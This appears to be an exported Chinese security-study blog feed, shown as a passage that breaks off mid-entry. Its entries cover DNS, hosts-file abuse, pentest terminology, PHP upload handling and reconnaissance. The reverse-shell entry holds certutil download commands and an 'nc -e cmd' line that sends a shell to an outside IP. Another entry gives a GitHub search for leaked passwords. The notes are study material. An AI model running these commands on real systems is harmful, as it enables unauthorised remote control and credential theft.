        <content type="html"><![CDATA[<p>基础</p><span id="more"></span><h1 id="网站搭建前置知识"><a href="#网站搭建前置知识" class="headerlink" title="网站搭建前置知识"></a>网站搭建前置知识</h1><h2 id="域名，子域名，DNS"><a href="#域名，子域名，DNS" class="headerlink" title="域名，子域名，DNS"></a>域名，子域名，DNS</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>域名：形如<a href="http://www.xiaodi8.com,www是二级域名,xiaodi8.com是一级域名./">www.xiaodi8.com，www是二级域名，xiaodi8.com是一级域名。</a><br>域名解析限制：国内域名必须备案，大陆外服务器不用备案也能访问，按量付费解决访问的月费过贵问题。<br>访问限制：服务器的安全组配置</p><h3 id="域名注册"><a href="#域名注册" class="headerlink" title="域名注册"></a>域名注册</h3><p>国内域名注册商：阿里云万网。</p><h3 id="域名对安全的意义"><a href="#域名对安全的意义" class="headerlink" title="域名对安全的意义"></a>域名对安全的意义</h3><ol><li>增加渗透人员对网站的攻击面，提高了攻击的成功率</li><li>增加暴力猜测难度</li></ol><h2 id="本地hosts文件-DNS"><a href="#本地hosts文件-DNS" class="headerlink" title="本地hosts文件-DNS"></a>本地hosts文件-DNS</h2><p>DNS是将域名解析为 IP 地址的分布式数据库系统。</p><p>Windows本地host文件存放地址：“C:\Windows\System32\drivers\etc\hosts”</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># 打开文件后显示如下映射关系</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">127.0</span>.<span class="number">0.11</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> www.banding.<span class="keyword">com</span></span><br><span class="line"># 格式：</span><br><span class="line"># IP地址    域名</span><br><span class="line"># 将IP地址 映射为某个域名</span><br><span class="line"># CMD清除DNS缓存：ipconfig /flushdns</span><br><span class="line"></span><br><span class="line"># Linux由于发行版较多的原因，清除修改hosts文件的形式较多，暂不赘述</span><br></pre></td></tr></table></figure><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><h3 id="通过主机名称获取IP地址的过程"><a href="#通过主机名称获取IP地址的过程" class="headerlink" title="通过主机名称获取IP地址的过程"></a>通过主机名称获取IP地址的过程</h3><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/SEC-Study-002/c3.jpg?raw=true" alt="DNS"></p><h3 id="浏览器搜索域名的过程"><a href="#浏览器搜索域名的过程" class="headerlink" title="浏览器搜索域名的过程"></a>浏览器搜索域名的过程</h3><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/SEC-Study-002/c4.jpg?raw=true" alt="DNS"></p><h3 id="递归服务器获取记录存入本地"><a href="#递归服务器获取记录存入本地" class="headerlink" title="递归服务器获取记录存入本地"></a>递归服务器获取记录存入本地</h3><pre><code>递归服务器：指能够向其他 DNS 服务器发出查询请求，并返回查询结果的服务器。          它通常用于响应用户设备或其他服务器发出的 DNS 查询请求，以帮助解析域名并将其转换为相应的 IP 地址。</code></pre><p>递归服务器拿到解析DNS资源解析记录并存入本地，下次需要时直接取出记录。</p><p><strong>DNS资源记录类型如下</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A记录:       将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</span><br><span class="line">            Address，IPV4</span><br><span class="line"></span><br><span class="line">CNAME记录:   如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名</span><br><span class="line">             Canonical Name规范名</span><br><span class="line"></span><br><span class="line">MX记录:         建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录</span><br><span class="line">                Mail Exchange邮件交换</span><br><span class="line"></span><br><span class="line">NS记录:         域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录</span><br><span class="line">                Name Server 域名服务器</span><br><span class="line"></span><br><span class="line">TXT记录:        可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录</span><br><span class="line">                Text</span><br><span class="line"></span><br><span class="line">AAAA记录:       将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录</span><br><span class="line">                Address 地址 IPV6</span><br><span class="line"></span><br><span class="line">SRV记录:        添加服务记录服务器服务记录时会添加此项，SRV记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）。</span><br><span class="line">                Service</span><br><span class="line"></span><br><span class="line">SOA记录:        SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器</span><br><span class="line">                Start of Authority起始授权机构</span><br><span class="line"></span><br><span class="line">PTR记录:        PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名</span><br><span class="line">                Point 指针</span><br><span class="line"></span><br><span class="line">显性URL转发记录: 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址为：www.itbilu.com。</span><br><span class="line"></span><br><span class="line">隐性UR转发记录L: 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址，隐性转发会隐藏真实的目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址仍然是：www.liuht.cn。</span><br></pre></td></tr></table></figure><h3 id="DNS正向与反向解析"><a href="#DNS正向与反向解析" class="headerlink" title="DNS正向与反向解析"></a>DNS正向与反向解析</h3><p><strong>正向解析</strong> (常用):向下解析，将 <strong>域名解析为 IP 地址</strong> 的过程。这是 DNS 最常用的解析方式。通过向 DNS 服务器发出正向查询请求，可以获取该域名所对应的 IP 地址。</p><p><strong>反向解析</strong> :向上解析，是将 <strong>IP 地址解析为域名</strong> 的过程。这种解析方式通常用于安全或反垃圾邮件目的。通过向 DNS 服务器发出反向查询请求，可以获取该 IP 地址所对应的域名。</p><h3 id="本地host文件与DNS的关系"><a href="#本地host文件与DNS的关系" class="headerlink" title="本地host文件与DNS的关系"></a>本地host文件与DNS的关系</h3><ol><li>本地 host 文件和 DNS 服务器都可以将域名解析为 IP 地址，但它们的作用范围不同。</li><li>本地host文件地址：C:\Windows\System32\drivers\etc</li><li>host文件可以重定向域名解析的IP地址 <strong>(安全风险)</strong></li><li>ping：优先查看并且使用本地host文件当中对应域名映射的IP地址，而不是向DNS服务器发起查询获取IP地址。  <strong>(安全风险)</strong></li><li>应用：<ol><li>网站钓鱼攻击：伪造虚假网站，获取登录的各种凭证。 –&gt; 可以通过修改本地host文件来定向到恶意网站。</li><li>游戏加速：修改IP地址实现最近的高速节点下载。</li></ol></li></ol><p>本地 host 文件只对本地计算机有效，而 DNS 解析是在互联网上进行的，可以为全球范围内的用户提供域名解析服务。<br>在某些情况下，用户可能需要将某些域名映射到本地的 IP 地址上，以便于 <strong>测试或访问内部网络资源</strong> ，这时候可以通过编辑本地 host 文件来实现。</p><h2 id="HTTP-HTTPS，证书等"><a href="#HTTP-HTTPS，证书等" class="headerlink" title="HTTP/HTTPS，证书等"></a>HTTP/HTTPS，证书等</h2><p>HTTP不安全，HTTPS相对安全。</p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>CDN（Content Delivery Network）是一种分布式网络架构，可以将静态资源（如图片、视频、音频等）缓存在离用户最近的节点，以提高资源的访问速度和稳定性。</p><p>简单来说，就是存点东西在离你近的服务器，方便你访问。但它携带的是主机的缓存，而不携带主机的IP地址。</p><p>CDN主要看地区，与DNS的切换无关。</p><h1 id="WEB应用环境架构类"><a href="#WEB应用环境架构类" class="headerlink" title="WEB应用环境架构类"></a>WEB应用环境架构类</h1><p>理解不同WEB应用组成角色功能架构:</p><blockquote><p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等<br>开发语言：asp,php,aspx,jsp,java,python,ruby,go,html,javascript等<br>程序源码：根据开发语言分类；应用类型分类；开源CMS分类(CMS：内容管理系统)；开发框架(功能写好，直接调用即可)分类等 <strong>（漏洞源）</strong><br>中间件容器：IIS,Apache,Nginx,Tomcat,Weblogic,Jboos,glasshfish等 -支撑网站运行，各有各的好处<br>数据库类型：Access,Mysql,Mssql,Oracle,db2,Sybase,Redis,MongoDB等 - 网站用户数据存放等，比如存储VIP用户信息<br>服务器操作系统：Windows系列，Linux系列，Mac系列等<br>第三方软件：phpmyadmin,vs-ftpd,VNC,ELK,Openssh等</p></blockquote><h1 id="WEB应用安全漏洞分类"><a href="#WEB应用安全漏洞分类" class="headerlink" title="WEB应用安全漏洞分类"></a>WEB应用安全漏洞分类</h1><h2 id="漏洞源"><a href="#漏洞源" class="headerlink" title="漏洞源"></a>漏洞源</h2><p>漏洞源头在源码上：</p><blockquote><p>SQL注入，文件安全，RCE执行，XSS跨站，CSRF/SSRF/CRLF，反序列化，逻辑越权，未授权访问，XXE/XML，弱口令安全等<br>明白漏洞产生的基本层面</p></blockquote><h2 id="本地host文件安全漏洞"><a href="#本地host文件安全漏洞" class="headerlink" title="本地host文件安全漏洞"></a>本地host文件安全漏洞</h2><p>本质：修改本地host文件解析记录</p><blockquote><p>DNS欺骗：攻击者可以在本地host文件中添加假的域名解析记录，使用户访问一个假的网站，而不是正确的网站。</p><p>会话劫持：攻击者可以在本地host文件中添加假的域名解析记录，将用户重定向到一个假的登录页面，以窃取用户的登录凭证。</p><p>恶意软件攻击：恶意软件可以修改本地host文件中的域名解析记录，将用户重定向到恶意网站，从而感染用户的计算机。</p><p>安全性破坏：攻击者可以修改本地host文件中的域名解析记录，以避开某些网络安全设备或软件的检测。</p></blockquote><h2 id="常见的DNS攻击"><a href="#常见的DNS攻击" class="headerlink" title="常见的DNS攻击"></a>常见的DNS攻击</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">DNS欺骗攻击：攻击者通过修改DNS服务器中的资源记录，将目标网站的域名解析到攻击者控制的恶意网站上，从而欺骗用户输入敏感信息。</span><br><span class="line">            (其中一种：改你host)</span><br><span class="line">DNS缓存污染攻击：攻击者通过向DNS缓存服务器发送虚假的DNS解析请求，使得DNS缓存服务器将虚假的DNS解析结果缓存下来，进而影响到所有向该DNS缓存服务器发起的DNS解析请求。</span><br><span class="line"></span><br><span class="line">DNS服务器劫持攻击：攻击者通过攻击ISP的DNS服务器或企业内部DNS服务器等，篡改DNS解析结果，将用户重定向到攻击者的恶意网站上。</span><br><span class="line"></span><br><span class="line">欺骗性WiFi接入点攻击：攻击者通过伪造WiFi接入点，诱使用户连接并获取虚假的DNS解析结果，从而被重定向到攻击者的恶意网站上。</span><br><span class="line"></span><br><span class="line">DNS投毒攻击：攻击者通过发送大量虚假的DNS解析请求，向DNS服务器投毒，使得DNS服务器不能正常响应DNS解析请求，或者响应虚假的DNS解析结果。将虚假的DNS响应伪装成合法的响应，从而将用户导向恶意网站。</span><br><span class="line"></span><br><span class="line">DNS重定向攻击：攻击者通过篡改DNS响应，将用户的请求重定向到攻击者控制的服务器上，从而窃取用户的敏感信息或者对目标网站进行DDoS攻击。</span><br><span class="line"></span><br><span class="line">DNS隧道攻击：攻击者通过DNS协议传输非法数据，绕过网络安全设备进行远程控制或者信息窃取等活动。</span><br><span class="line"></span><br><span class="line">DNS拒绝服务攻击：攻击者通过大量的DNS请求，使目标DNS服务器无法正常工作，导致目标网站无法正常解析域名或提供服务。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="WEB请求返回过程数据包参考："><a href="#WEB请求返回过程数据包参考：" class="headerlink" title="WEB请求返回过程数据包参考："></a>WEB请求返回过程数据包参考：</h1><h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><p><strong>概念</strong> :</p><p>网页会发送和接收请求，这个请求的载体就是数据包。</p><p><strong>参考资料-数据包结构/web请求</strong> :</p><p><a href="https://www.jianshu.com/p/558455228c43">Web请求</a><br><a href="https://www.cnblogs.com/cherrycui/p/10815465.html">数据包相关文章</a></p><p><strong>大致结构</strong> ：</p><p>请求数据包，请求方法，请求体，响应包，响应头，状态码，代理服务器等<br>Request,Response,User-Agent,Cookie,Server,Content-Length等</p><p>UA头是身份信息，代表是PC端还是安卓端。<br>数据包漏洞点：网站页面，抓住数据包某些情况下能突破限制，如：XFF请求头伪造，XSS跨站脚本攻击等。</p><p>和请求数据包相关的可以看通分类下的：SEC-Study-0000-http/https</p><h2 id="常见注入参数"><a href="#常见注入参数" class="headerlink" title="常见注入参数"></a>常见注入参数</h2><blockquote><p>User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）<br>Cookie：网站为了辨别用户身份进行session跟踪，并储存在用户本地终端上的数据（通常经过加密）<br>X-Forwarded-For：简称XFF头，代表了HTTP的请求端真实的IP。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库或某文件[通过修改XXF头可以实现伪造IP]）。<br>Rerferer：浏览器向 WEB 服务器表明自己的页面来源。<br>Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。</p></blockquote><h1 id="网站目录扫描"><a href="#网站目录扫描" class="headerlink" title="网站目录扫描"></a>网站目录扫描</h1><h2 id="状态码-返回包"><a href="#状态码-返回包" class="headerlink" title="状态码-返回包"></a>状态码-返回包</h2><p>网站目录扫描的前提，需要涉及状态码</p><p>状态码请本地搜索 “SEC-Study-0000-http/https”文章进行查看。</p><h2 id="代理-本地代理与远程代理"><a href="#代理-本地代理与远程代理" class="headerlink" title="代理-本地代理与远程代理"></a>代理-本地代理与远程代理</h2><ul><li><p>本地代理：</p><ul><li>开启BP后截取数据包，浏览器必须安装证书，手机模拟器也需要安装代理(两者必须在同一个局域网)。</li><li>BP可以实现很多功能，实际可以实现BP爆破等。</li></ul></li><li><p>远程代理的作用</p><ul><li>远程代理的站点：<a href="https://www.kuaidaili.com/">快代理</a></li><li>地址白名单：白名单地址不用验证账号和密码就可以使用该代理 - 绑定你的公网IP</li><li>查真实ip的网站ip138.com：查自己的网络出口IP地址</li><li>远程代理的作用：避免自己的IP被封禁。 - 跳板</li></ul></li></ul><h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>阿里云购买计时服务器(记得释放，用香港的) - 阿里云购买域名 - 宝塔一键搭建网站 - 配置域名解析</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-基础入门-01 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0001-专业术语/反弹shell</title>
      <link href="/2023/04/11/SEC-Study-0027/"/>
      <url>/2023/04/11/SEC-Study-0027/</url>
      
        <content type="html"><![CDATA[<p>22版学习日志-基础</p><span id="more"></span><h1 id="渗透测试专业术语"><a href="#渗透测试专业术语" class="headerlink" title="渗透测试专业术语"></a>渗透测试专业术语</h1><h2 id="POC-EXP-Payload-Shellcode"><a href="#POC-EXP-Payload-Shellcode" class="headerlink" title="POC+EXP+Payload+Shellcode"></a>POC+EXP+Payload+Shellcode</h2><blockquote><p>POC       全称 &#39; Proof of Concept &#39;，中文 &#39; 概念验证 &#39; ，常指一段漏洞证明的代码。  <strong>(漏洞验证)</strong><br>EXP       全称 &#39; Exploit &#39;，中文 &#39; 利用 &#39;，指利用系统漏洞进行攻击的动作。          <strong>(漏洞利用★)</strong><br>Payload   中文 &#39; 有效载荷 &#39;，指成功exploit之后，真正在目标系统执行的代码或指令。     <strong>(代码执行)</strong><br>Shellcode 简单翻译 &#39; shell代码 &#39;，是Payload的一种，由于其建立正向/反向shell而得名。 <strong>(权限通道)</strong></p></blockquote><h2 id="后门-WebShell-木马-病毒-反弹，回显，跳板，黑白盒测试，暴力破解，撞库，ATT-amp-CK等"><a href="#后门-WebShell-木马-病毒-反弹，回显，跳板，黑白盒测试，暴力破解，撞库，ATT-amp-CK等" class="headerlink" title="后门/WebShell,木马/病毒,反弹，回显，跳板，黑白盒测试，暴力破解，撞库，ATT&amp;CK等"></a>后门/WebShell,木马/病毒,反弹，回显，跳板，黑白盒测试，暴力破解，撞库，ATT&amp;CK等</h2><blockquote><p><strong>webshell</strong> ：网站后门的专称<br><strong>木马</strong> ：控制，实行操作。<br><strong>病毒</strong> ：破坏性质。<br><strong>反弹</strong> ：权限反弹出到其他地方进行控制。例如弹出root用户权限，在别的地方利用这个权限读取后台文件等等。<br><strong>跳板</strong> ：中介作用，在别人黑西工大的时候就是用到了跳板。例如A想访问C，不能直接访问，那么久接触B，通过B访问C。此时的B就是中介。<br><strong>黑白盒测试</strong> : 黑盒没有源代码，不知道目标的某些情况。白盒测试是知道目标源代码和目标情况的，譬如网络公开的源代码。<br><strong>社会工程学</strong> : 惯性使用生日或者个人信息等设置弱密码。信任问题等。例如个人电话号码，生日等，攻击者可以利用这些信息伪造一个字典去进行爆破。社工库是某些平台信息泄露后收集起来的数据库，里面有很多个人信息。<br><strong>暴力破解</strong> : 使用弱密码或者弱账号对登录网站进行爆破。<br><strong>撞库</strong> : </p><blockquote><p>通过社工库获取相关人员的信息，在某些平台上去尝试碰撞，看他有没有账户登录或注销什么的，最终通过一个号拿到其他号等。例如某人个人服务器绑定在某邮箱上，刚好你撞上去了，通过邮箱修改了账号服务器的归属，相当于直接取人家网站的后台了。<br>撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户<br>很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。<br><strong>ATTC&amp;CK</strong> : 很多专业名词都在这里。一个比较重要的专有名词网站。<a href="https://attack.mitre.org/">点我前往</a></p></blockquote></blockquote><p><a href="https://forum.ywhack.com/bountytips.php?tools">棱角社区</a><br><a href="https://www.cnblogs.com/sunny11/p/13583083.html">渗透测试常用术语</a></p><h1 id="操作系统-用途-amp-命令-amp-权限-amp-用户-amp-防火墙"><a href="#操作系统-用途-amp-命令-amp-权限-amp-用户-amp-防火墙" class="headerlink" title="操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙"></a>操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</h1><blockquote><p>1、个人计算机&amp;服务器用机<br>2、Windows&amp;Linux<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">常见命令</a><br>3、<strong>文件权限&amp;服务权限&amp;用户权限等</strong> - 权限受限会影响到脚本、文件等的获取★★</p><blockquote><p>用户权限与用户组权限管理 &gt; 影响是一个人还是一群人<br>当前用户权限不足以完成你的目的 – <strong>提权(数据库提权)</strong><br>Windows权限优先级：优先拒绝</p></blockquote><p>4、系统用户&amp;用户组&amp;服务用户等分类</p><blockquote><p>按照组对用户进行管理，可以批量授权。</p></blockquote><p>5、自带防火墙出站&amp;入站规则策略协议</p><blockquote><p>防火墙：存储入站和出站的相关 <strong>协议</strong> ，默认支持网站等部分协议<br>类别：Windows自带防火墙，Linux防火墙iptables，WAF(web防火墙，比如安全狗)<br>特征：入站严苛，出站松散。<br>主要影响方面：内网测试涉及协议较多，影响较大(真正意义上的阻止)；外网渗透测试一般影响不大。</p></blockquote></blockquote><h1 id="反弹Shell命令-解决数据回显-amp-解决数据通讯"><a href="#反弹Shell命令-解决数据回显-amp-解决数据通讯" class="headerlink" title="反弹Shell命令-解决数据回显&amp;解决数据通讯"></a>反弹Shell命令-解决数据回显&amp;解决数据通讯</h1><h2 id="文件上传下载-解决无图形化-amp-解决数据传输"><a href="#文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="文件上传下载-解决无图形化&amp;解决数据传输"></a>文件上传下载-解决无图形化&amp;解决数据传输</h2><blockquote><p>Linux：wget curl python ruby perl java等<br>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等<br>具体在棱角社区。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">网站：<span class="number">192.168</span>.<span class="number">232.193</span>:<span class="number">80</span></span><br><span class="line">网站上的文件：PhpStorm-<span class="number">2023.1</span>.exe</span><br><span class="line">存储到本地并且重命名：php.exe</span><br><span class="line"></span><br><span class="line">Linux</span><br><span class="line">表示的是从 <span class="number">192.168</span>.<span class="number">232.193</span>:<span class="number">80</span>的地方下载PhpStorm-<span class="number">2023.1</span>.exe到本地，并且以php.exe的文件名保存</span><br><span class="line">curl http:<span class="comment">//192.168.232.193:80/PhpStorm-2023.1.exe -o php.exe</span></span><br><span class="line">wget http:<span class="comment">//192.168.232.193:80/PhpStorm-2023.1.exe -O php.exe</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">powershell.exe -Command <span class="string">&quot;Invoke-WebRequest -Uri http://192.168.232.193:80/PhpStorm-2023.1.exe -OutFile php.exe&quot;</span></span><br><span class="line">powershell.exe -Command <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadFile(&#x27;http://192.168.232.193:80/PhpStorm-2023.1.exe&#x27;,php.exe)&quot;</span></span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http:<span class="comment">//192.168.232.193:80/PhpStorm-2023.1.exe php.exe</span></span><br><span class="line">copy \\<span class="number">192.168</span>.<span class="number">232.193</span>\files\PhpStorm-<span class="number">2023.1</span>.exe php.exe</span><br></pre></td></tr></table></figure><blockquote><p>目的：为了显示、回显数据，达到命令交互的目的</p><blockquote><p>交互式：交互式问答，不是直接返回结果。交互会卡在某一个环节，反弹shell能直接解决实时交互的问题。<br>useradd 用户名 passwd 用户名<br>测试Linux系统添加用户或修改密码命令交互回显问题–卡在输入密码那儿</p></blockquote></blockquote><h2 id="防火墙绕过-正向连接-amp-反向连接-amp-内网服务器"><a href="#防火墙绕过-正向连接-amp-反向连接-amp-内网服务器" class="headerlink" title="防火墙绕过-正向连接&amp;反向连接&amp;内网服务器"></a>防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</h2><p>1、内网：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">内网 -&gt; xiaodi8.com</span><br><span class="line">xiaodi8.com !-&gt; 内网</span><br><span class="line">表示的含义是：内网可以连接到外网的“xiaodi8.com”网站，而xiaodi8.com却不能连接到内网。</span><br><span class="line">内网连接外网网站是唯一的</span><br><span class="line">外网访问内网主机不是唯一的 </span><br><span class="line">    -- 举个例子，一个路由器上有一个公网IP，下面有N个内网主机。</span><br><span class="line">    -- 外网访问内网主机时，只能访问到一路由器的公网IP，而不能具体的连接到内网主机</span><br><span class="line">    -- 如果想要连接内网主机，除非内网主机主动弹出shell。</span><br></pre></td></tr></table></figure><p>2、防火墙：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xiaodi8      &lt;-&gt; aliyun</span><br><span class="line">xiaodi8防火墙 --&gt; aliyun</span><br><span class="line">aliyun       !-&gt; xiaodi8防火墙</span><br><span class="line">路由器端口映射：外网转发数据包到路由器，路由器将数据包转发到内网指定主机。</span><br><span class="line">防火墙策略：入站严密出站宽松-&gt;让内网服务器自己出来找你</span><br><span class="line"></span><br><span class="line">防火墙限制某些端口：限制正向端口就用反向给出cmd，限制反向则用正向给出cmd。正反端口都被封禁就只能换端口了。</span><br><span class="line">尽可能的让服务给出来。</span><br></pre></td></tr></table></figure><h2 id="瑞士军刀之内网反弹-nc攻击"><a href="#瑞士军刀之内网反弹-nc攻击" class="headerlink" title="瑞士军刀之内网反弹-nc攻击"></a>瑞士军刀之内网反弹-nc攻击</h2><p>文件下载&amp;反弹Shell:</p><blockquote><p>fofa直接搜索pikachu，会直接显示所有的pikachu靶场 – 现在可能查不到了，可以本地搭建一个</p></blockquote><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc：瑞士军刀，网络测评工具</span><br><span class="line"></span><br><span class="line">使被攻击者主动到远程服务器下载nc工具</span><br><span class="line">certutil -urlcache -split -f http:<span class="comment">//www.xiaodi8.com/nc.exe C://nc.exe</span></span><br><span class="line"></span><br><span class="line">-- 受攻击方：</span><br><span class="line">使用nc将cmd权限移动至对应的外网及端口</span><br><span class="line">nc -e cmd <span class="number">47.75</span>.<span class="number">212.155</span> <span class="number">5566</span></span><br><span class="line"></span><br><span class="line">-- 攻击方：</span><br><span class="line">监听本地的端口<span class="number">5566</span></span><br><span class="line">nc -lvvp <span class="number">5566</span></span><br></pre></td></tr></table></figure><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>nc命令端口上的考虑<br>不要使用已经被占用的端口，例如80端口，会使命令失效</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-基础入门-01 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0026</title>
      <link href="/2023/04/10/SEC-Study-0026/"/>
      <url>/2023/04/10/SEC-Study-0026/</url>
      
        <content type="html"><![CDATA[<p>文件上传+文件路径访问</p><span id="more"></span><h1 id="PHP文件操作安全"><a href="#PHP文件操作安全" class="headerlink" title="PHP文件操作安全"></a>PHP文件操作安全</h1><p>PHP开发的目的：通过开发思考开发的安全问题。</p><ul><li>文件包含，文件上传，文件下载，文件删除，文件写入，文件遍历</li></ul><h1 id="文件管理模块-上传-过滤机制"><a href="#文件管理模块-上传-过滤机制" class="headerlink" title="文件管理模块-上传-过滤机制"></a>文件管理模块-上传-过滤机制</h1><p>1、无过滤机制<br>2、黑名单过滤机制<br>3、白名单过滤机制<br>4、文件类型过滤机制</p><p>架构：<br>1、上传至服务器本身的存储磁盘-&gt;有解析的可能<br>2、借助云产品OSS存储对象去存储文件-&gt;后门无法解析，但OSS有泄露风险（例如JS泄露oss的连接账密）。<br>3、把文件上传到其他域上。(可能存在单纯存放文件的域名，类型OSS的那种。如果分离时是存入OSS就没法执行后面程序了。)<br>传递到OSS的解决办法：找到key漏洞。<br>网站越复杂，漏洞越多。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;表单值&quot;</span>][<span class="string">&quot;name&quot;</span>] 获取上传文件原始名称</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;表单值&quot;</span>][<span class="string">&quot;type&quot;</span>] 获取上传文件MIME类型</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;表单值&quot;</span>][<span class="string">&quot;size&quot;</span>] 获取上传文件字节单位大小</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;表单值&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>] 获取上传的临时副本文件名  =&gt; 切忌随便乱删临时文件夹和和权限</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;表单值&quot;</span>][<span class="string">&quot;error&quot;</span>] 获取上传时发生的错误代码</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>() 将上传的文件移动到指定位置的函数</span><br></pre></td></tr></table></figure><h1 id="文件管理模块-显示-过滤机制"><a href="#文件管理模块-显示-过滤机制" class="headerlink" title="文件管理模块-显示-过滤机制"></a>文件管理模块-显示-过滤机制</h1><p>功能：显示 上传 下载 删除 编辑 包含等<br>1.打开目录读取文件列表<br>2.递归循环读取文件列表<br>3.判断是文件还是文件夹<br>4.PHP.INI目录访问控制</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_dir</span>() 函数用于检查指定的路径是否是一个目录</span><br><span class="line"><span class="title function_ invoke__">opendir</span>() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录</span><br><span class="line"><span class="title function_ invoke__">readdir</span>() 函数用于从打开的目录句柄中读取目录中的文件和子目录</span><br><span class="line">open_basedir：PHP.INI中的设置用来控制脚本程序访问目录</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0024</title>
      <link href="/2023/04/09/SEC-Study-0024/"/>
      <url>/2023/04/09/SEC-Study-0024/</url>
      
        <content type="html"><![CDATA[<p>信息收集-公众号</p><span id="more"></span><h1 id="微信公众号-获取-amp-三方服务"><a href="#微信公众号-获取-amp-三方服务" class="headerlink" title="微信公众号-获取&amp;三方服务"></a>微信公众号-获取&amp;三方服务</h1><p>1、网页中获取微信公众号途径:<a href="https://weixin.sogou.com/">搜狗</a></p><p>2、微信公众号有无第三方服务</p><ul><li>非腾讯官方提供的服务,跳转到自己设置的网站</li><li>所有功能使用非腾讯接口</li><li>全是腾讯接口提供服务则表明此公众号没有资产</li></ul><h1 id="Github监控-开发-amp-配置-amp-源码"><a href="#Github监控-开发-amp-配置-amp-源码" class="headerlink" title="Github监控-开发&amp;配置&amp;源码"></a>Github监控-开发&amp;配置&amp;源码</h1><p>目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点。</p><p>1、人员&amp;域名&amp;邮箱等筛选</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">基于开发者信息，域名，邮箱等等的各种各样的条件去搜索。</span><br><span class="line">eg：xxx.cn password in:file</span><br><span class="line">开源平台：</span><br><span class="line">https:<span 